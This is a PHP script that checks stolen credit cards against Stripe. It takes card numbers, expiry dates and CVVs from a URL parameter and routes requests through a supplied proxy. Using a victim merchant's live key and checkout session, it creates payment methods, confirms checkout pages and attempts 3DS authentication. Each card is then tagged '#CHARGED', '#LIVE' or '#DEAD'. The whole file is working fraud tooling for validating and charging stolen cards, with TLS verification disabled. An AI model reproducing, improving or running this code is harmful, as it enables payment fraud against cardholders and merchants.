<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$lista = $_GET['cards'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$xamount = $_GET['xamount'];
$xemail = $_GET['xemail'];


$hydra = $_GET['hydra'];
$ip = $_GET['ip'];
$proxy = ''.$ip.'';
$proxyauth = ''.$hydra.'';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);

$curl_scraped_page = curl_exec($ch);

curl_close($ch);

$curl_scraped_page;

#########1st
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Jake+minas&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&key='.$pklive.'&payment_user_agent=stripe.js%2F97dfa8730%3B+stripe-js-v3%2F97dfa8730%3B+checkout';

$headers = array();
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $curl0 = curl_exec($ch);
curl_close($ch);

 
$pm = Getstr($curl0,'"id": "','"');
 "<br>";
 "<br>";


##########2nd

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'eid=NA&payment_method='.$pm.'&expected_amount='.$xamount.'&last_displayed_line_item_group_details[subtotal]='.$xamount.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pklive.'';

$headers = array();
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $curl1 = curl_exec($ch);
curl_close($ch);

 
$three_d_secure_2_source = Getstr($curl1,'"three_d_secure_2_source": "','"');

 $client_secret = Getstr($curl1,'"client_secret": "','"');
 "<br>";
 $pi = Getstr($curl1,'"client_secret": "','_secret_');
  "<br>";
 "<br>";
#############3rd


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22873%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+21061110AG)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F87.0.4280.141+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pklive.'';

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $result = curl_exec($ch);
curl_close($ch);

 "<br>";
 "<br>";
###############4th
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pklive.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$result1 = curl_exec($ch);
curl_close($ch);

 $result1;
 $dcode1 = Getstr($result1,'"code": "','"');
 "<br>";
 "<br>";
 "<br>";
###############4th
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'?key='.$pklive.'&eid=NA');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$result2 = curl_exec($ch);
curl_close($ch);

  $result2;
 $dcode2 = Getstr($result2,'"code": "','"');
 #############SUCCEEDED SUCCESS
 if (strpos($result1, '"status": "succeeded"')) {
    echo "<font color=green><b>#CHARGED $lista<br>Payment successfully<br>";
    
    exit();
}
#############DECLINECODEcurl0
elseif(strpos($curl0, 'card_not_supported')) {
    echo "<font color=red><b>#DEAD $lista<br>card_not_supported<br>";
    exit();
}
elseif(strpos($curl0, 'generic_decline')) {
    echo "<font color=red><b>#DEAD $lista<br>generic_decline<br>";
    exit();
}
if (strpos($curl0, '"insufficient_funds"')) {
    echo "<font color=green><b>#LIVE $lista<br>insufficient_funds<br>";
   
    exit();
}



#############DECLINECODEcurl1
elseif(strpos($curl1, 'fraudulent')) {
    echo "<font color=red><b>#DEAD $lista<br>fraudulent<br>";
    exit();
}
elseif(strpos($curl1, 'incorrect_number')) {
    echo "<font color=red><b>#DEAD $lista<br>incorrect_number<br>";
    exit();
}
elseif(strpos($curl1, 'invalid_account')) {
    echo "<font color=red><b>#DEAD $lista<br>invalid_account<br>";
    exit();
}
elseif(strpos($curl1, 'generic_decline')) {
    echo "<font color=red><b>#DEAD $lista<br>generic_decline<br>";
    exit();
}
if (strpos($curl1, '"insufficient_funds"')) {
    echo "<font color=green><b>#LIVE $lista<br>insufficient_funds<br>";
   
    exit();
}





#############DECLINECODEresult1
elseif(strpos($result1, 'payment_intent_authentication_failure')) {
    echo "<font color=red><b>#DEAD $lista<br>The provided Payment Method has failed authentication.<br>";
    exit();
}
elseif(strpos($result1, 'BEGIN CERTIFICATE')) {
    echo "<font color=red><b>#DEAD $lista<br>3D SECURED CARD<br>";
    exit();
}
elseif(strpos($result1, 'fraudulent')) {
    echo "<font color=red><b>#DEAD $lista<br>fraudulent<br>";
    exit();
}
elseif(strpos($result1, 'generic_decline')) {
    echo "<font color=red><b>#DEAD $lista<br>generic_decline<br>";
    exit();
}
if (strpos($result1, '"insufficient_funds"')) {
    echo "<font color=green><b>#LIVE $lista<br>insufficient_funds<br>";
   
    exit();
}




#############ELSEDECLINE
 else
   {
     echo"<font color=red><b>#DEAD $lista<br>CARD DECLINED<br>";
     exit();
   }
 
?>